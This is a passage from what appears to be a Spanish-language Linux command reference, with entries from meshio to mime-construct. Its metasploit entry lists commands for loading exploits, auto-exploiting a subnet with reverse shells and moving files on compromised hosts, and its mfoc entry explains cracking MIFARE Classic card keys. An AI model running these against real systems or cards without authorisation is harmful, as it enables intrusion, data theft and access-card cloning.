Puede leer y escribir en varios formatos de datos que representan mallas no estructuradas, como DOLFIN, Gmsh, H5M o VTK. Este paquete también incluye la herramienta msh2xdmf para convertir formatos de malla Gmsh [.msh] al formato XDMF [.xdmf], que es comúnmente usado en simulaciones numéricas. Un archivo de malla o mesh file es un archivo que almacena la información geométrica y topológica de un objeto o dominio. En el contexto de las simulaciones numéricas, una malla es una discretización del espacio, dividiendo un objeto tridimensional, una superficie o una línea en elementos más pequeños y simples, como triángulos, tetraedros o hexaedros.
$ meshio convert malla.msh malla.vtk (convertir malla.msh a malla.vtk)
$ $ meshio info input.xdmf (Mostrar información como: que contiene 100 puntos, 150 triángulos y 50 tetraedros, además de un campo de datos llamado temperature asociado a los puntos)
$ meshio compress input.vtu (comprimir el archivo especificado)
$ meshio decompress input.vtu (descomprimirlo)
$ meshio ascii malla.vtk (convertir un archivo VTK de formato binario a ascii)
$ meshio binary malla.vtk (convertir a binary)
$ msh2xdmf domino.msh domino (convertir una malla Gmsh a dominio.xdmf y dominio.h5 con los datos de la malla)


meson
Sistema de compilación para herramientas como "ninja" [backend predeterminado] diseñado para ser rápido, eficiente y fácil de usar. Meson se utiliza principalmente para compilar proyectos de software escritos en lenguajes como C, C++, Rust, Python, Fortran, entre otros. Su objetivo es simplificar el proceso de configuración y compilación de proyectos grandes, como Gnome, X.org, o systemd, ofreciendo una sintaxis clara y un rendimiento superior en comparación con otros sistemas como Make o CMake. A diferencia de escribir manualmente Makefiles, Meson utiliza un lenguaje de alto nivel, legible y declarativo para definir cómo se debe compilar un proyecto.
1.-
Ejemplo de funcionamiento con un proyecto simple en C que imprime "¡Hola, mundo!".
Estructura del proyecto
        mi_proyecto/
        ├── meson.build
        └── src/
            └── main.c
El contenido de main.c:
        #include <stdio.h>
        int main() {
            printf("¡Hola, mundo!\n");
            return 0;
        }
Contenido de meson.build en la raiz del proyecto que describe las fuentes, dependencias, opciones de compilación y artefactos: ejecutables, bibliotecas, etc.
        project('mi_proyecto', 'c',
          version: '1.0',
          default_options: ['warning_level=3'])
        executable('mi_programa',
          'src/main.c',
          install: true)
project: Define el nombre del proyecto y el lenguaje principal [c] y executable: Especifica que queremos compilar un ejecutable llamado mi_programa a partir de src/main.c.
$ meson setup builddir (genera los archivos de compilación en el directorio builddir)
$ ninja -C builddir (compila el proyecto)
$ ./builddir/mi_programa (ejecuta el programa)
$ ninja -C builddir install (Instala el programa en el sistema)
2.-
Ejemplo de proyecto con dependencias usando la biblioteca libcurl para hacer una solicitud HTTP
Estructura del proyecto**
        proyecto_curl/
        ├── meson.build
        └── src/
            └── main.c
            tests/
            └── test.c
Contenido de main.c:
        #include <curl/curl.h>
        #include <stdio.h>
        int main() {
            CURL *curl = curl_easy_init();
            if (curl) {
                curl_easy_setopt(curl, CURLOPT_URL, "https://example.com");
                CURLcode res = curl_easy_perform(curl);
                if (res != CURLE_OK)
                    fprintf(stderr, "Error: %s\n", curl_easy_strerror(res));
                curl_easy_cleanup(curl);
            }
            return 0;
        }
Contenido de meson.build
        project('proyecto_curl', 'c',
          version: '1.0',
          default_options: ['warning_level=3'])
        # Busca la dependencia libcurl
        curl_dep = dependency('libcurl', required: true)
        executable('curl_ejemplo',
          'src/main.c',
          dependencies: [curl_dep],
          install: true)
Pasos para compilar
Asegurarse de tener libcurl instalado:
# apt install libcurl4-openssl-dev
$ meson setup builddir (configurar el proyecto)
$ ninja -C builddir (compilar)
$ meson test -C builddir
$ ./builddir/curl_ejemplo (ejecutar)
Hace una solicitud HTTP a example.com y muestra el resultado.
$ meson setup builddir --buildtype=release (pasar opciones al configurar el proyecto, como el tipo de compilación [debug, release, minsize]
$ meson configure builddir (definir opciones personalizadas y configurarlas)


messages
Contar el número de mensajes del buzón.
$ messages
        Number of messages in /var/mail/root: 31
$ messages -s (solo mostrar el número)


metacam
Extraer información EXIF de archivos de cámaras digitales. EXIF [Exchangeable Image File Format] es un estándar para almacenar información de intercambio en archivos de imagen, especialmente aquellos que utilizan compresión JPEG. La mayoría de las cámaras digitales, incluidos los teléfonos móviles, utilizan actualmente el formato EXIF.
$ metacam IMG_20240811_152933_117.jpg (ver datos EXIF de la imagen especificada)
$ metacam -a -x imagen.jpg > datos_exif.xml (ver todos los tags y salida en formato XML y guardarlos en datos_exif.xml)


metacaracteres
Permiten ampliar comandos o combinar varios para construir una única orden lógica. Son varios: la tuberia [|], redirección [<>], el asterisco [*], la tilde [~], el simbolo dolar [$], el circunflejo [^], el interrogante [?], la almoadilla [#], los corchetes [[]], parentesis [()], llaves [{}], arroba [@]...
$ date ; who (semicolon-punto y coma [;] es un separador entre ordenes que se ejecutan secuencialmente)
$ date | wc -m (pipe-tuberia [|] mandar la salida de un comando a otro)
$ date \ (Backslash-barra inversa [\] posibiita escribir ordenes en la siguiente linea)
> | wc -m
$ ls \*textos*/ (tambien permite escapar un carácter. Por ejemplo listara el directorio llamado *textos-largos)
$ (date | who) | wc (parentesis [()] aislan ordenes separadas por punto y coma o tuberia y se ejecutan como una única orden)
$ ls {*txt,*sh} (llaves [{}] Crea un bloque de código ejecutado en el propio interprete. Listará todos los .txt y .sh)
$ htop & (Ampersand-et [&] Indica que ejecuta un trabajo en segundo plano [background] liberando la terminal donde se ha lanzado)
  $ jobs
  [1]+  Aturat                  htop
  $ %1
  htop
$ ld || date (OR [||] Sólo se ejecuta la siguiente orden si la primera falla)
$ ld && date (AND [&&] Sólo se ejecuta la siguiente orden si la primera tiene exito)
$ date > ~/fecha.txt (redirigir la salida del comando date a un archivo [>] en el directorio del usuario [~])
$ ls | grep png$ (dolar [$] buscar los archivos que terminan con png)
$ ls | grep ^c (caret-circunflejo [^] buscar los que empiezan por c)
$ ls | grep ??? (interrogante [?] substituye un coracter, por tanto en el ejemplo buscar los archivos con 3 caracteres)
Nota.- Algunos metacaracteres, según el contexto, pueden tener otros significados. Por ejemplo el dolar [$] puede referirse a una funcion:
$ echo $HOME


metacity
gestor de ventanas
$ metacity --replace (activar metacity)


metalfinder
Herramienta que escanea un directorio de música para encontrar conciertos cerca de una ubicación específica. Requiere registro en alguna: https://www.concerts-metal.com/next_FR-A.html, https://www.concerts-metal.com/next_FR-B.html,
$ export METALFINDER_BIT_APPID=mysecretapikey
$ metalfinder -d "~/Musica" -o "~/metalfinder.txt" -l "Madrid"


metamonger
Se utiliza para guardar, comparar y restaurar los metadatos de archivos y directorios, tales como mtime, atime, uid, gid, modos y otros atributos POSIX, utilizando un backend de almacenamiento en JSON fácilmente legible y editable, lo que facilita el control de cambios y la integración con sistemas de control de versiones como Git. Su enfoque en operar con metadatos, no el contenido de archivos y resulta útil para comprobaciones de integridad y restauración de permisos, usuarios o fechas originales.
$ metamonger save /srv/data > metadatos.json (guarda los metadatos en formato JSON en el archivo metadatos.json)
$ metamonger diff metadatos.json /srv/data (comparar los metadatos actuales con un respaldo previo en metadatos.json)
$ metamonger restore metadatos.json /srv/data (aplicará los metadatos guardados, ajustando permisos, tiempos, propietario, grupo, etc)
$ git add metadatos.json (permite auditar y restaurar versiones históricas de metadatos, subiendolo a git)
$ git commit -m "Actualización de metadatos de /srv/data"


metapixel
Generar mosaicos de fotos [collage].
$ mkdir collage (Crear el directorio)
$ metapixel-prepare --width=10 --height=10 -r Imatges/ collage (Copiar con las medidas introducidas [width y height] desde el directorio de imágenes de forma recursiva [-r] al directorio creado)
$ metapixel --metapixel Imagenes/imagen.jpeg destino.jpg --library collage/ (Que coja la imágen.jpg del directorio Imagenes y la convierta en destino.jpg usando el directorio "collage")


metar
Utilidad que descarga informes meteorológicos para aviación desde el servidor HTTP de la NOAA en noaa.gov. Los códigos de las estaciones en https://tgftp.nws.noaa.gov/data/nsd_bbsss.txt [LEBB --> Bilbao, LEBL --> Barcelona, LEMD --> Madrid/Barajas...]
$ metar -d LEGE (Decodificar los informes meteorológicos en un formato legible para humanos de Girona, España)
        Station       : LEGE
        Day           : 18
        Time          : 05:00 UTC
        Wind direction: 0 (N)
        Wind speed    : 0 KT
        Wind gust     : 0 KT
        Visibility    : 500 M
        Temperature   : 16 C
        Dewpoint      : 16 C
        Pressure      : 1022 hPa
        Clouds        :
        Phenomena     : Fog


metasploit
Herramienta utilizada para realizar pentesting, tanto para comprometer sistemas como para obtener datos antes y después de comprometerlo. Los módulos auxiliares se pueden usar para el escaneo de puertos, la identificación del servicio, el rastreo de contraseñas y la enumeración de parches. Para empezar es necesario tener activado el servicio postgresql, crear la configuración inicial y luego iniciar Metasploit Framework:
# service postgresql start
$ msfd
# msfconsole (crea la base de datos en /home/usuario/.msf4/db)
Cada exploit tiene uno de siete posible rangos; excelente (mejor elección), grandioso, bueno, normal, promedio, bajo, y manual (peor elección). Un rango bajo del exploit, implica la probabilidad de causar algún daño en el objetivo, o no estar en la capacidad de entregar el payload seleccionado. Unos comandos básicos:
msf6 > help show (mostrar los parámetros disponibles para el comando show)
msf6 > show exploits (Mostrar todos los exploits del Framework)
msf6 > show payloads (Mostrar todos los payloads del Framework)
msf6 > show targets (lista de sistemas operativos que son vulnerables al exploit seleccionado)
msf6 > set payload nom_paylo (cargar un payload especifico)
msf6 > show auxiliary (Mostrar todos los módulos auxiliares del Framework)
msf6 > help search (búsqueda con exploits con palabras clave)
msf6 > search name:2018 (buscar módulos con un ID de NAME de 2018)
msf6 > search nom_explo (Búsqueda por nombre del exploit)
msf6 > search localhost (encontrar herramientas relacionadas con localhost)
msf6 > search type:[exploit, payload, auxiliary, encoder, post] [nom_explo] (Búsqueda por tipo y nombre del exploit)
msf6 > use nom_explo (Carga el exploit indicado)
msf6 > show options (Muestra las opciones de un exploit)
msf6 > info (Muestra información acerca de un exploit cargado)
msf6 > set RHOSTS 192.168.154.0/24 (asignar valor a las variables)
msf6 > set SRVPORT 80 (asignar puerto)
msf6 > run (realizar la ejecución del módulo/auxiliary cargado)
msf6 > back (salir del exploit que se está usando)
msf6 > connect 192.168.1.34 23 (conectar a un host)
msf6 > jobs (Se trata de módulos que se encuentran en ejecución en segundo plano. Permite listar y terminar trabajos existentes.
msf6 > connect -s 192.168.1.34 22 (conectar con SSL a un host por el puerto 22)
msf6 > load -l (listar los plugins disponibles)
msf6 > load Plugin (cargar un plugin del listado anterior)
msf6 > unload Plugin (descargar el plugin)
msf6 > show encoders (mostrar codificadores compatibles)
msf6 > use exploit/windows/http/struts2_rest_xstream (usar un exploit concreto)
msf6 > sessions -l (ver sesiones activas)
msf6 > sessions -l -v (Muestra la lista de sesiones disponibles en modo verbose)
msf6 > sessions -i <session-id> (entrar en una sesión específica)
msf6 > sessions -i 1 (interactuar con la primera sesión)
msf6 > sessions -s script (Ejecuta un script específico en todas las sesiones activas)
msf6 > sessions -K (Mata todas las sesiones activas)
msf6 > sessions -c cmd (Ejecuta un comando en todas las sesiones activas)
msf6 > exploit -j (Ejecuta un exploit en background)
msf6 > exploit -z (No interactúa con la sesión después de acceder con éxito)
msf6 > exploit -e encoder (Especifica el encoder a usar con el payload)
msf6 > exploit -h (Muestra la ayuda para el exploit especificado)
msf6 > db_create nombre (Crea una base de datos)
msf6 > db_connect nombre (Crea y se conecta a una base de datos)
msf6 > db_nmap (Usa y carga los resultados de Nmap en una base de datos)
msf6 > db_autopwn -h (Muestra la ayuda para usar db_autopwn)
msf6 > db_autopwn -p -r -e (Ejecuta db_autopwn contra todos los puertos encontrados, usa una shell reversa y los explota)
msf6 > db_destroy (Elimina la actual base de datos)
msf6 > db_destroy usuario:contraseña@host:puerto/base_de_datos (Borra una base de datos concreta)
msf6 > db_status (Verificar el estado operativo de la base de datos)
msf6 > hosts (todos los hosts registrados en la base de datos)
msf6 > services (enumerar los servicios registrados en la base de datos)
msf6 > vulns (Detallar todas las vulnerabilidades registradas en la base de datos)
msf6 > upload ./localpath/data.txt C:\Temp\data.txt (transferir un archivo local al remoto)
msf6 > download C:\Temp\data.txt ./localpath/data.txt (descargar un archivo del remoto a local)
msf6 > exit (salir de metasploit)
# msfupdate (actualizar la base de datos de exploits)


metastore
Herramienta que almacena metadatos de archivos y directorios, como permisos, propietario, grupo, timestamps, atributos extendidos, etc. en un archivo de texto plano, generalmente llamado .metastore y luego, puede comparar esos metadatos con el estado actual del sistema de archivos y restaurarlos si es necesario. Es especialmente útil con sistemas de control de versiones como Git, SVN, etc. que no guardan metadatos, solo contenido.
$ metastore -s -f file (guarda todos los metadatos actuales del directorio actual y los guarda en file, por defecto en .metadata)
$ metastore -s -i Documentos (exceptuando la carpeta Documentos y guardando en .metadata)
$ metastore -c (muestra las diferencias entre los metadatos almacenados y los actuales sin modificar nada)
$ metastore -a (cambia los metadatos de archivos/directorios para que coincidan con los guardados)
$ metastore -c && metastore -a (verifica si hay diferencias, y solo si las hay, las aplica)


mfoc
[Mifare Offline Cracker]. Permite recuperar las claves de autenticación de las tarjetas de memoria MIFARE Classic. Se basa en un ataque criptográfico sin conexión que aprovecha una debilidad en el generador de números aleatorios de los chips MIFARE Classic. El proceso comienza intentando leer un sector de la tarjeta para el que ya se conoce al menos una clave. Si no se conoce ninguna clave, el programa suele empezar con las claves por defecto comunes. Al intentar la autenticación con una clave, la tarjeta responde con un valor cifrado. mfoc captura esta respuesta, que contiene información sobre un "nonce" [un valor aleatorio de un solo uso]. A partir de estos valores, mfoc realiza cálculos matemáticos para deducir las claves de otros sectores. Esto se debe a que el algoritmo de generación de nonces en estas tarjetas es débil y predecible. Una vez que se ha descifrado una clave, el programa puede usarla para autenticarse en ese sector, leer sus datos y, lo que es más importante, obtener más información para descifrar las claves de otros sectores. Este proceso se repite hasta que se han recuperado todas las claves de todos los sectores de la tarjeta. Requiere un lector NFC compatible y la tarjeta MIFARE Classic que se desea analizar.
$ mfoc -O tarjeta.mfd (indica que se debe guardar la información del crackeo en el archivo especificado)
$ mfoc -k A0A1A2A3A4A5 -O tarjeta.mfd (proporcionar la clave de un sector de la tarjeta que se conoce)
$ mfoc -P 500 -O tarjeta.mfd (realizar un crackeo y volcar la memoria de la tarjeta en un solo paso) con 500 intentos de autentificación)


mftrace
Herramienta escrita en Python que se utiliza para convertir fuentes de mapa de bits generadas por METAFONT, usadas en el sistema de composición tipográfica TeX, a fuentes escalables en formato PostScript Type 1 [PFA o PFB]. Esto es útil cuando se quiere utilizar una fuente diseñada para TeX en otros sistemas o aplicaciones que no soportan directamente fuentes METAFONT, pero sí fuentes PostScript.
$ mftrace --output-directory=./fuentes_type1 cmr10.mf (convertir .mf a Type 1)
$ mftrace --output-directory=./fuentes_type1 cmr10.600gf (convertir .gf a Type 1)
$ mftrace --output-directory=./fuentes_type1 --verbose cmr10.mf (lo mismo mostrando más información)


mg
Editor microscópico estilo GNU Emacs. Ctrl-x Ctrl-c para salir.
$ mg file.txt


mgen
Ofrece la capacidad de realizar pruebas y mediciones de rendimiento de la red IP utilizando el tráfico TCP y UDP/IP. Los mensajes de prueba se pueden generar, recibir y registrar. mgen ofrece control sobre todos los parámetros de red y la sincronización de estos mensajes. Información: https://github.com/USNavalResearchLaboratory/mgen/blob/master/doc/mgen.pdf


mgetty
[mgetty-fax mgetty-voice]. Permite usar un módem para gestionar inicios de sesión externos, recibir faxes y usarlo como contestador automático sin interferir con las llamadas salientes.
Ejemplo de archivo de configuración
# nano /etc/mgetty/login.config
       # Puerto ttyS0: acepta llamadas y permite login
       /dev/ttyS0    -    -    115200  speed 115200
Indica que cuando alguien llame por /dev/ttyS0 [tambien podría ser /dev/ttyUSB0], inicie mgetty con velocidad 115200.
Configurar el puerto
# nano /etc/mgetty/mgetty.config
       port ttyS0
       data-only no
       fax-only no
       voice-only no
       debug 3
# systemctl enable mgetty@ttyS0.service (habilitar el servicio)
# systemctl start mgetty@ttyS0.service
Para recibir faxes añadir al archivo de configuración /etc/mgetty/login.config la linea:
      /dev/ttyS0    -    -    115200  speed 115200 fax
Y para configurar el fax, editar o crear el archivo:
# nano /etc/mgetty/fax/mfax.config
       # /etc/mgetty/fax/mfax.config
       fax-dir /var/spool/fax/incoming
       fax-sender-id "MiEmpresa"
       fax-receiver-id "MiEmpresa"
# mkdir -p /var/spool/fax/incoming (crear directorio para faxes recibidos)
# chown fax:fax /var/spool/fax/incoming (y el propietario)
# systemctl restart mgetty@ttyS0.service (reiniciar el sevicio)
Para usar como contestador automático añadir al archivo de configuración /etc/mgetty/login.config la linea:
       /dev/ttyS0    -    -    115200  speed 115200 voice
Y para configurar el contestador:
# nano /etc/mgetty/voice/voice.config
       voice-dir /var/spool/voice
       max-message-length 60
       prompt-file /usr/share/mgetty/voice/prompt/voice-prompt
# mkdir -p /var/spool/voice (crear directorios para grabar mensajes)
# chown voice:voice /var/spool/voice (el usuario)
# voice -d /dev/ttyS0 (entra en modo voz con un terminal conectado al módem)
En modo interactivo se pueden usar comandos como "play", "record", "exit"
# journalctl -u mgetty@ttyS0.service -f (ver logs)


mgitstatus
Herramienta que recorre varios repositorios Git e informa, para cada uno, de los cambios no confirmados, no rastreados y no enviados. Entrar en el directorio de los proyectos y lanzar la aplicación.
$ mgitstatus
uncommitted --> Archivos modificados que aún no se han hecho git add + git commit.
untracked --> Archivos nuevos que Git no está rastreando.
unpushed --> Número de commits locales que aún no se han enviado [git push] al remoto.


mgmt
Herramienta de automatización en tiempo real [que opera de manera continua y reactiva]. Usa un lenguaje propio llamado MCL [Mgmt Configuration Language] para definir las reglas para describir qué se quiere que pase en el sistema, por ejemplo, "este archivo debe existir con estos permisos" o "este servicio debe estar corriendo en X hosts".
Un ejemplo para ver como funciona
Supongamos que se tiene un servidor de archivos que sea de solo lectura los viernes.
# nano viernes.mcl
        $is_friday = datetime.weekday == 5;  # 5 = viernes
        file "/srv/files/" {
            state => $const.res.file.state.exists,
            mode => if $is_friday { "0550" } else { "0770" },  # Solo lectura vs. lectura/escritura
        }
# mgmt run viernes.mcl (lo aplica y monitorea en la propia máquina)
# mgmt deploy viernes.mcl (lo propaga a todos los hosts, ajustando en tiempo real si es viernes)


mh-book
[Universidad Miguel Hernandez]. El Sistema de Manejo de Mensajes MH es un conjunto de programas de correo electrónico de dominio público. Este libro también abarca tres interfaces populares, o front-ends, de MH [xmh y exmh]. Incluye una guía paso a paso para cada interfaz que permitirá enviar y leer correo en pocas páginas. El indice en file:///usr/share/doc/mh-book/html/index.html y en linea en https://mh-e.sourceforge.io/manual/html/index.html


mha4mysql-manager
Administrador de Alta Disponibilidad y Herramientas MHA [Master High Availability] para MySQL que automatiza la conmutación por error [failover] de un servidor maestro y la promoción del esclavo a un nuevo servidor, minimizando el tiempo de inactividad y garantizando la consistencia de los datos. Incluye las herramientas masterha_check_repl, masterha_check_ssh, masterha_check_status, masterha_conf_host, masterha_manager, masterha_master_monitor, masterha_master_switch, masterha_secondary_check y masterha_stop.
$ masterha_check_repl --conf=/etc/masterha/app1.cnf (comprueba el estado de replicación de todos los nodos en el grupo MHA según la configuración en el archivo app1.cnf)
$ masterha_check_ssh --conf=/etc/masterha/app1.cnf (verifica la conectividad SSH sin contraseña entre los servidores del grupo y garantiza que el usuario configurado puede acceder a todos los servidores)
$ masterha_check_status --conf=/etc/masterha/app1.cnf (verifica si el proceso de masterha_manager está activo y monitorizando el clúster)
$ masterha_conf_host --conf=/etc/masterha/app1.cnf (muestra la configuración de los servidores en el clúster MHA)
$ masterha_manager --conf=/etc/masterha/app1.cnf --daemonize (inicia el manager en segundo plano)
$ masterha_master_monitor --conf=/etc/masterha/app1.cnf (verifica si el maestro está en línea y accesible)
$ masterha_master_switch --conf=/etc/masterha/app1.cnf --new_master_host=node2 --orig_master_host=node1 --ignore_binlog_error (fuerza una conmutación por error, promoviendo node2 como el nuevo maestro en lugar de node1)
$ masterha_secondary_check --conf=/etc/masterha/app1.cnf (valida la salud de los servidores esclavos)
$ masterha_stop --conf=/etc/masterha/app1.cnf (finaliza el demonio masterha_manager asociado a la configuración app1.cnf)


mhap
Toma "huellas dactilares" de párrafos en lugar de leer todo el libro, identifica combinaciones únicas de palabras ["min-meros"] en cada párrafo y les asigna un número [un "hash"]. Busca huellas similares en dos párrafos de libros diferentes y si tienen muchas "huellas dactilares" [números hash] en común, es muy probable que sean el mismo párrafo, incluso si algunas palabras están mal escritas y te da un informe que dice: "El párrafo de la página 120 del Libro A se solapa con el párrafo de la página 245 del Libro B". Con "libros" se refiere a fragmentos de ADN secuenciados que constan de miles a millones de letras y que pueden tener entre un 5-15% de error (palabras mal escritas, letras cambiadas...)
$ mhap -s lecturas.fasta -q lecturas.fasta --num-threads 8 > solapamientos.mhap (especifica el archivo de las lecturas, que se comparen contra ellas mismas, usando 8 nucleos de CPU y donde guardar la salida)
En el archivo solapamientos.mhap, cada línea representa un solapamiento detectado. Por ejemplo:
        lectura_123 0 10500 15000 + lectura_456 500 11000 10500 - 0.95
Una explicación simplificada de esta salida sería:
lectura_123 y lectura_456se solapan. En lectura_123, el solapamiento va desde la posición 10.500 a la 15.000. En lectura_456, el solapamiento va desde la posición 500 a la 11.000. "+" y "-" indican la orientación, es decir si están en la misma hebra o en la complementaria y 0.95 es la similitud estimada [95%].


mhc
[Message Harmonized Calendar]. Herramienta que permite gestionar agendas personales y citas extrayendo información de mensajes de correo electrónico, pensado especialmente para quienes reciben la mayoría de las citas por correo electrónico. Aunque está muy integrado con Emacs, el paquete mhc-utils proporciona el binario mhc para operar desde el sistema fuera de Emacs. Configuración en ~/.config/mhc/config.yml
$ mhc list (mostrará los eventos almacenados en la agenda para el periodo que cubre la fecha actual)
$ mhc grep reunión (buscar todos los eventos que contengan la palabra "reunión" en sus detalles o asunto)
$ mhc list --today (mostrar las citas para la fecha actual)
$ mhc import evento.ics (convertirá el evento iCal a un registro en la agenda personal de mhc)
$ mhc export --all --ical > agenda.ics (exporta todos los eventos a un archivo en formato iCal compatible con otros sistemas de calendario)


mhonarc
Herramienta basada en Perl que convierte archivos de correo electrónico, en formato MH, mbox u otros, en archivos HTML, generando índices cronológicos, enlaces a hilos de correo y manejando mensajes MIME para cada mensaje,
$ mhonarc inbox (creará archivos como: maillist.html [índice de todos los mensajes por fecha], threads.html [índice por hilos de conversación] y msg00000.html, msg00001.html, ... [mensajes individuales en HTML])
$ mhonarc -outdir public_html/correos ~/Mail/inbox (convierte el buzón inbox en HTML en el directorio public_html/correos)
$ mhonarc -outdir archivomail inbox (guardar los archivos HTML generados en archivomail/)
$ mhonarc -add inbox (añadir nuevos mensajes en un HTML existente)
$ mhonarc -single < mensaje.txt > mensaje.html (convierte un mensaje aislado a HTML y lo guarda con redirección)
$ mhonarc -rcfile mi_config.mrc inbox (permite insertar elementos o modificar la estructura de los archivos HTML resultantes)


mhz
Utilidad de medición de frecuencia de CPU. Esta herramienta mide las velocidades de reloj reales de la CPU. Resulta útil en plataformas donde la compatibilidad con cpufreq aún no está disponible o donde los valores de velocidad de reloj devueltos por el kernel no son fiables. Esto aplica a plataformas donde los proveedores hacen trampa, donde se producen limitaciones inusuales de velocidad de reloj por razones desconocidas o donde las velocidades de reloj reales se configuran mediante puentes, mientras que las velocidades de reloj disponibles para el kernel se derivan de las entradas del árbol de dispositivos (DT).
$ mhz -c (hace un bucle para mostrar solo la frecuencia de la CPU en MHz)
        3888.146
$ mhz -t (hace un bucle usando acceso al reloj [rdtsc] en vez de operaciones de CPU)
        2807.977
Los valores 3888 y 2807 MHz indican que la CPU escala dinámicamente y puede subir a 4 GHz con turbo.
$ mhz -i (informar solo las frecuencias integrales)
        count=1550236 us50=19930 us250=98050 diff=78120 cpu_MHz=3969 tsc50=55968951 tsc250=277968045 diff=143 rdtsc_MHz=2842
count=1547858 --> número de iteraciones que ejecutó el bucle de prueba.
us50 y us250 --> tiempo en microsegundos que tardó en hacer el bucle en ventanas de 50 µs y 250 µs respectivamente.
diff=78189 --> diferencia de tiempo entre ambas mediciones.
cpu_MHz=3960 --> estimación de MHz calculada con operaciones de CPU, similar a -c.
tsc50 y tsc250 --> valores del contador de tiempo [rdtsc] tomados en las ventanas de 50 y 250 µs.
diff=142 --> diferencia de ticks del TSC en ese periodo.
rdtsc_MHz=2816 --> frecuencia estimada a partir del TSC, similar a -t.


mi
muestra información sobre los dispositivos montados [dispositivo de bloques, punto de montaje, opciones de montaje y sistema de ficheros utilizado]. Ver di
$ mi


micro
Editor de texto que pretende ser una especie de sucesor del editor Nano. Ctrl-q para salir.
$ micro file.txt


microcom
Herramienta de terminal minimalista diseñada para conectarse a dispositivos mediante puertos serie [RS232] o mediante conexiones Telnet [RFC 2217]. Es especialmente útil para interactuar con dispositivos embebidos, routers, switches, placas de desarrollo, como Raspberry Pi sin interfaz gráfica, módems, etc., que exponen una consola serial.
$ microcom -s 115200 /dev/ttyUSB0 (conectar a un dispositivo en /dev/ttyUSB0 a 115200 baudios)
$ microcom -s 9600 -p e -d 7 -t 2 /dev/ttyS0 (conectar al dispositivo especificado con velocidad 9600, paridad par, 7 bits, 2 bits de parada)
Los parámetros de paridad pueden ser:
        n = none [sin paridad]
        o = odd [impar]
        e = even [par]
        m = mark
        s = space
$ microcom -t 192.168.1.100:2000 (conecta a un switch remoto por Telnet serie)
$ microcom -s 9600 /dev/ttyUSB0 (depurar un router o switch por puerto consola, conectanado un cable serial [USB a Serial] al puerto consola del switch. Muchos dispositivos de red usan 9600 baudios por defecto)
$ microcom -t console-server.local:3001 (conectarse a un servidor de consolas seriales en red)
Nota.- Para salir de la sesión, Ctrl + x


microdc2
Cliente para el protocolo de Conexión Directa [Direct Connect - DC] que permite compartir archivos entre usuarios conectados a un "hub" P2P e interactuar con otros "hubs", buscar, descargar archivos, así como chatear con otros usuarios utilizando la biblioteca GNU Readline para facilitar la edición de comandos y el historial.
$ microdc2 (iniciar microdc2)
        microdc2> help
        microdc2> alias MI_ALIAS
        microdc2> connent hub.ejemplo.com:411
        microdc2> get FILE
        microdc2> say MESSAGE
        microdc2> search WORD
        microdc2> disconnect
        microdc2> exit


microfono
(activar micro del monitor).
# gedit /etc/modprobe.d/alsa-base.conf
Añadir:
options snd_hda_intel model=laptop options snd-hda-intel position_fix=1 enable=yes
Reiniciar


micropython
Permite probar programas diseñados para microcontroladores, como un ESP32 o una Raspberry Pi Pico y sistemas con recursos limitados pero sin necesidad de tener el hardware conectado. Esto es ideal para desarrollo y depuración inicial, ya que se puede verificar la lógica del programa antes de cargarlo en el microcontrolador. Sin embargo, no se podrán probar funcionalidades que dependen del hardware específico, como el control de pines GPIO, el acceso a periféricos como I2C o SPI, etc.
$ micropython (entrar en modo interactivo [REPL - Read-Eval-Print Loop])
        MicroPython v1.25.0+ds-1 on 2025-05-04; linux [GCC 14.2.0] version
        Use Ctrl-D to exit, Ctrl-E for paste mode
        >>> print("Linux es un sistema genial")
        Linux es un sistema genial
        >>>
        >>> a = 10
        >>> b = 20
        >>> a + b
        30
        >>>
$ micropython mi_programa.py (ejecutar un archivo .py)
$ micropython -c "print('Linux es un sistema genial')" (ejecutar código directamente desde la línea de comandos)


microsocks
Servidor SOCKS5 es un servicio que se puede ejecutar en equipos remotos para tunelizar conexiones a través de ellos si, por alguna razón, SSH no funciona por tener el puerto 22 bloqueado o no se tiene acceso a un servidor SSH. Diseñado para ser fácil de usar, multiproceso y sin necesidad de un archivo de configuración.
$ microsocks (iniciará un servidor SOCKS5 en el puerto 1080, puerto por defecto y escuchará en todas las interfaces de red 0.0.0.0)
$ microsocks -p 8080 (usar un puerto diferente)
$ microsocks -i 192.168.1.100 -p 1080 (solo aceptará conexiones entrantes en la IP 192.168.1.100)
$ microsocks -u mi_usuario -P mi_contraseña -p 1080 (requerir autenticación usuario/contraseña)
$ microsocks -d -p 1080 (ejecutar como un servicio en segundo plano)
$ microsocks -c 10 -p 1080 (solo permitir 10 conexiones simultáneas)
Un caso practivo
Supongamos un servidor remoto con IP 203.0.113.45 y se quiere tunelizar el tráfico a través de él:
$ microsocks -p 1080 -u USER -P PASSWD (En el servidor remoto)
En la máquina local, configurar el cliente, por ejemplo curl
$ curl --socks5 203.0.113.45:1080 -U USER:PASSWD https://ejemplo.com


midge
Herramienta que convierte texto en archivos MIDI, permitiendo describir música en formato textual y generar secuencias MIDI compatibles con General MIDI, además de ofrecer funciones como generación aleatoria de secuencias, descompilador y modo Emacs.
Un texto midge típico de unas cuantas escalas musicales, según los ejemplo del directorio /usr/share/doc/midge/examples/, podría ser:
$ nano scales.mg
@head {
     $tempo 120
     $time_sig 4/4
}
@body {
     @channel 1 "bass" {
           $patch bass_fg
           %repeat 4 {
                   /l3:8/a3=>b-3=>a3
                   /l8/g3 r /l32/d /l3:32/e /l8/g a
           }
     }
     @channel 10 "tamborine" {
           %repeat 4 { /l4r4/tamb }
     }
}
$ midge scales.mg -o scañes.mid
$ timidity scales.mid


midori
Navegador web. Los archivos de configuración en .config/midori/
1.-
Añadir buscadores:
En el desplegable "Añadir motores de búsqueda" colocar el nombre y en "comando" (en el ejemplo duckduckgo):
https://duckduckgo.com/?q=%s


migrate-pubring-from-classic-gpg
Migra el formato de llavero "clásico" de contraseñas pubring.gpg al formato de llavero "moderno", utilizado en las versiones 2.1 o 2.2 de GnuPG, pubring.kbx. Especificando --default se selecciona el directorio de inicio estándar de GnuPG  ~/.gnupg.
# migrate-pubring-from-classic-gpg --default


mii-tool
Muestra información similar a ethtool (Ver)
# mii-tool eth0


mime-construct
Construir/enviar mensajes MIME [Multipurpose Internet Mail Extensions] desde la línea de comandos. MIME es una extensión del protocolo de correo electrónico que permite enviar contenido más allá de texto plano en formato ASCII. Originalmente diseñado para correo electrónico, MIME se usa para estructurar mensajes que pueden incluir texto en diferentes formatos, archivos adjuntos y contenido multimedia. Por defecto, mime-construct envía el mensaje a través de un servidor de correo, usando sendmail o similar, pero también puede generar el mensaje MIME sin enviarlo, redirigiéndolo a un archivo o a la salida estándar.
